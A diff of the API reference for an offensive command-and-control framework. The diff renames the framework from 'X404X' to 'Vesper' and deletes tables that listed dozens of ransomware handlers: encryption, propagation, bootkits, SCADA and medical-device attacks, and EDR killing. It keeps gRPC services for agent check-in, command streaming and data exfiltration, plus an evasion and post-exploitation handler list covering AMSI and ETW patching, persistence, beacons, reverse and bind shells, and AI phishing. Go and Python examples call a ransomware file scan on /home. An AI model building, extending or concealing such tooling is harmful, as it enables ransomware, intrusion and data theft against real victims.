@@ -1,4 +1,4 @@
-# X404X — API Reference (v3.2)
+# Vesper — API Reference (v3.2)
 
 ## Endpoints
 
@@ -109,7 +109,7 @@ Connect to `ws://localhost:8443/ws?campaign_id=X`
 
 The C2 server exposes three gRPC services at the configured port:
 
-**AgentService** (`x404x.v1.AgentService`)
+**AgentService** (`vesper.v1.AgentService`)
 ```
 rpc CheckIn(CheckInRequest) returns (CheckInResponse)
 rpc CommandStream(stream AgentMessage) returns (stream ServerMessage)
@@ -117,7 +117,7 @@ rpc Heartbeat(HeartbeatRequest) returns (HeartbeatResponse)
 rpc Exfiltrate(stream ExfilChunk) returns (ExfilAck)
 ```
 
-**C2Service** (`x404x.v1.C2Service`)
+**C2Service** (`vesper.v1.C2Service`)
 ```
 rpc ListAgents(ListAgentsRequest) returns (ListAgentsResponse)
 rpc GetAgent(GetAgentRequest) returns (AgentInfo)
@@ -131,7 +131,7 @@ rpc DecisionFeed(stream DecisionUpdate) returns (stream DecisionAck)
 rpc GetMetrics(MetricsRequest) returns (MetricsResponse)
 ```
 
-**BridgeService** (`x404x.v1.BridgeService`)
+**BridgeService** (`vesper.v1.BridgeService`)
 ```
 rpc ExecuteModule(ModuleRequest) returns (ModuleResponse)
 rpc AIAnalyze(AIAnalyzeRequest) returns (stream AIAnalyzeResponse)
@@ -141,27 +141,16 @@ rpc HealthCheck(HealthCheckRequest) returns (HealthCheckResponse)
 
 ## Python Bridge Handlers
 
-The bridge exposes 107 handlers across 12 registration files under `modules/bridge/handlers/`.
-
 ### Registry Groups
 
 | Group | Handlers | File |
 |-------|----------|------|
-| `ransomware` | execute, scan, encrypt, exfil, status, decrypt, generate_note, propagate, destruct | `ransomware.py` |
-| `ransomware_advanced` | hope_trap, identity_destroy, raas_panel, fake_decryptor, worm_deploy, supply_chain, cloud_exploit, bluetooth_prop, iot_botnet, scada_attack, hardware_kill, network_poison, captive_portal, dna_mutate, bootkit, blockchain_c2, survivor_game | `ransomware_advanced.py` |
-| `ransomware_v26` | pomdp_decide, ai_negotiate, evasion_deep, bootkit_smm, mobile_x, cloud_nemesis, social_c2, block_omega | `ransomware_v26.py` |
-| `ransomware_v27` | uefi_bootkit, hypervisor_ring1, pcie_rootkit, kernel_instrument, secure_boot_bypass, phishing_infra, spear_phish_ai, anti_phish_evasion, smishing_sms, vishing_voice | `ransomware_v27.py` |
-| `ransomware_v28` | iot_identity_theft, false_memory, thousand_cuts, patchguard_bypass, keyboard_led, zombie_army, legacy_poison, seo_sabotage, fake_vulns, inception_hv, isp_bgp, anti_attribution, power_grid_harmonics, time_lock, vr_spyware, global_ai_poison, cdn_injection, bio_cyber_dna, browser_parasite, fake_documents, sound_panic, emotional_encrypt, false_redemption | `ransomware_v28.py` |
-| `ransomware_v29` | hdd_firmware_destroy, vrm_overvoltage, acoustic_resonance, psu_corrupt, usb_killer, robot_sabotage, centrifuge_resonance, ui_shell_fake, deepfake_hallucinate, network_ghosts, medical_tamper, intel_me_flash, smm_handler, microcode_corrupt, nic_persist, mft_bitmap, backup_prune, journal_poison, dns_poison, bgp_phantom, ldap_intermittent, digital_thermite, honey_token, access_log_wipe | `ransomware_v29.py` |
-| `ransomware_v210` | apocalipsis, phantom_evasion | `ransomware_v210.py` |
-| `ransomware_blockz` | genetic_evolve, deepfake_generate, scada_covert, firmware_worm, medical_attack, model_poison, disinformation, airgap_exfil, post_quantum, deadman_arm, falseflag_plant, edr_kill, financial_crash, iot_chain | `ransomware_blockz.py` |
 | `phase_1_4` | byovd_loader, dkom, amsi_patch, etw_patch, syscall_proxy, hollowing, unhook_ntdll, evasion_misc, otp, sandbox_detect, network_covert, persist_scheduled, persist_wmi, persist_registry, stego_config, x25519_wireguard, quic_tunnel, webrtc_p2p, beacon_dns, beacon_https, beacon_smb, obfuscate_code, packer_upx, crypter_xor, embed_payload, rsrc_hide, connect_back, bind_shell, pivot_socks5, relaying, ai_target, ai_phishing, ai_deepfake, ai_vishing, c2_waterfall, c2_cloudfront | `phase_1_4.py` |
 
 ### Calling a Handler
 
 From Go:
 ```go
-resp := bridge.CallRaw(ctx, "ransomware", "scan", map[string]interface{}{
     "root": "/home",
     "max_files": 500,
 })
@@ -169,7 +158,6 @@ resp := bridge.CallRaw(ctx, "ransomware", "scan", map[string]interface{}{
 
 From Python:
 ```python
-from handlers.ransomware import handle_scan
 result = handle_scan({"root": "/home", "max_files": 500})
 ```
 
